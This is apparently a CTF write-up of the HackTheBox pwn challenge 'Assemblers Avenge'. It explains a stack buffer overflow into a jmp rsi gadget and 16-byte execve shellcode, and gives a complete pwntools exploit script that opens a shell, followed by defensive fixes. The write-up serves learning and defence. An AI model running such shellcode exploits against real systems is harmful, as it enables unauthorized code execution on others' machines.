---
title: "Assemblers Avenge"
date: 2027-10-16 09:00:00 -0500
categories: [HackTheBox, Challenges, Pwn]
tags: [hackthebox, challenge, pwn, ret2shellcode, shellcode, executable-stack, buffer-overflow, jmp-rsi, no-pie]
description: "A 24-byte read into an 8-byte stack buffer on an executable-stack, No-PIE binary. There is no room for a leak and none is needed — after the read, a register still points at the buffer, and a stray `jmp rsi` gadget turns that into ret2shellcode. The catch: only 16 bytes fit, so the execve stub reuses the binary's own `/bin/sh` string to avoid clobbering itself."
---

## Overview

Assemblers Avenge is an Easy [Pwn](https://cwe.mitre.org/data/definitions/121.html) challenge built from hand-written x86-64 assembly. A tiny `read()` overflows the saved return address on a binary whose stack is executable, so the whole solve is a [stack-based buffer overflow](https://cwe.mitre.org/data/definitions/121.html) that lands directly on injected shellcode — no libc, no ROP, no information leak. The only real puzzle is fitting a working `execve("/bin/sh")` into the 16 bytes the overflow leaves.

## The technique

`checksec` tells the whole story:

```text
Arch:     amd64-64-little
RELRO:    No RELRO
Stack:    No canary found
NX:       NX unknown - GNU_STACK missing      <- stack is executable
PIE:      No PIE (0x400000)                    <- fixed addresses
RWX:      Has RWX segments
```

The program is three hand-written functions. `_read` does the damage:

```asm
_read:  push rbp ; mov rbp,rsp ; sub rsp,0x10
        mov rdi, 0          ; fd = stdin
        lea rsi, [rbp-0x8]   ; buf = 8 bytes on the stack
        mov rdx, 0x18        ; len = 24
        mov rax, 0           ; SYS_read
        syscall
        leave ; ret
```

It reads **24 bytes** into an **8-byte** buffer. The stack frame is `[rbp-0x8] 8B buf | [rbp] saved rbp | [rbp+8] saved RIP`, so the input is *16 bytes of shellcode space* followed by the *8-byte return address* we control.

There is no stack leak, so we cannot just point RIP at the buffer by address — except that we don't have to. When `_read` returns, **`rsi` still holds `rbp-0x8`**, the address of our buffer (it was set for the read and nothing clobbers it). The binary happens to contain a `jmp rsi` instruction at `0x40106b` (the `ff e6` byte sequence in the tail of `_exit`). Overwriting the saved RIP with that gadget means:

```text
ret  --(retaddr = 0x40106b)-->  jmp rsi  -->  RIP = our buffer  -->  shellcode runs
```

Because the stack is RWX, the bytes we just wrote execute as code. This is the generic move whenever a `read`/`recv` leaves a register pointing at attacker bytes and a `jmp reg` / `call reg` gadget exists — it's a free substitute for an address leak.

## Solution

The remaining problem is size. We only have 16 bytes before the return-address slot, and the shellcode runs at the very top of the stack with `rsp` only ~16 bytes above it — so a classic `execve` stub that **pushes** `/bin/sh` onto the stack overwrites its own running code and crashes (`SIGILL` / `SIGSEGV`).

Two facts make a 16-byte, pushless stub possible:

- **No-PIE** means the binary's own `/bin/sh` string sits at a fixed address. It's right there in the banner the program prints — "Your only savior is: /bin/sh" — at `0x402065` (`objdump -s -j .data assemblers_avenge` shows the `2f62696e2f7368` bytes). So no string needs to be staged.
- `push 0x3b ; pop rax` sets `rax = SYS_execve` in **3 bytes** instead of `mov eax,0x3b` (5). Those two saved bytes are exactly what makes the whole stub fit in 16.

```asm
mov rdi, 0x402065   ; "/bin/sh"   (7 bytes — sign-extended mov, not movabs)
xor esi, esi        ; argv = NULL (2)
xor edx, edx        ; envp = NULL (2)
push 0x3b ; pop rax ; SYS_execve  (3)
syscall                            (2)   = 16 bytes exactly
```

Solve script (`solve.py`) — runnable verbatim:

```python
#!/usr/bin/env python3
import sys
from pwn import *

exe = './assemblers_avenge'
context.binary = ELF(exe, checksec=False)

JMP_RSI = 0x40106b
BINSH   = 0x402065

sc = asm(f'''
    mov rdi, {BINSH}
    xor esi, esi
    xor edx, edx
    push 0x3b
    pop rax
    syscall
''')
assert len(sc) <= 16

payload = sc.ljust(16, b'\x90') + p64(JMP_RSI)   # 24 bytes total

io = remote(sys.argv[1], int(sys.argv[2])) if len(sys.argv) >= 3 else process(exe)
io.recv(timeout=2)                # banner
io.send(payload)                   # ret -> jmp rsi -> shellcode -> /bin/sh
io.sendline(b'cat flag.txt')
io.interactive()
```

Running it against the instance drops a shell as the `ctf` user and reads the flag:

```bash
python3 solve.py <ip> <port>
# id -> uid=999(ctf)
# cat flag.txt -> HTB{...}
```

## Why it worked

The binary combines three weaknesses that, individually, are survivable but together are fatal: it reads a fixed `0x18` bytes into a buffer far smaller than that (the [overflow](https://cwe.mitre.org/data/definitions/121.html) itself), it links with an executable stack so injected bytes can run, and it is No-PIE so every address — the `jmp rsi` gadget and the `/bin/sh` string — is constant. The `jmp rsi` gadget is the elegant part: it removes the usual need for an information leak by reusing a live buffer pointer the calling convention left in a register.

## Fix / defense

- Link with `-z noexecstack` (the modern default) so the stack cannot execute injected shellcode — this alone breaks the chain.
- Bound the read to the buffer size: `read(0, buf, sizeof buf)`, never a hard-coded larger constant.
- Compile with `-fstack-protector-strong` so the saved-RIP overwrite is caught by a canary at return.
- Enable PIE/ASLR so the gadget and the in-binary `/bin/sh` are no longer at predictable addresses.
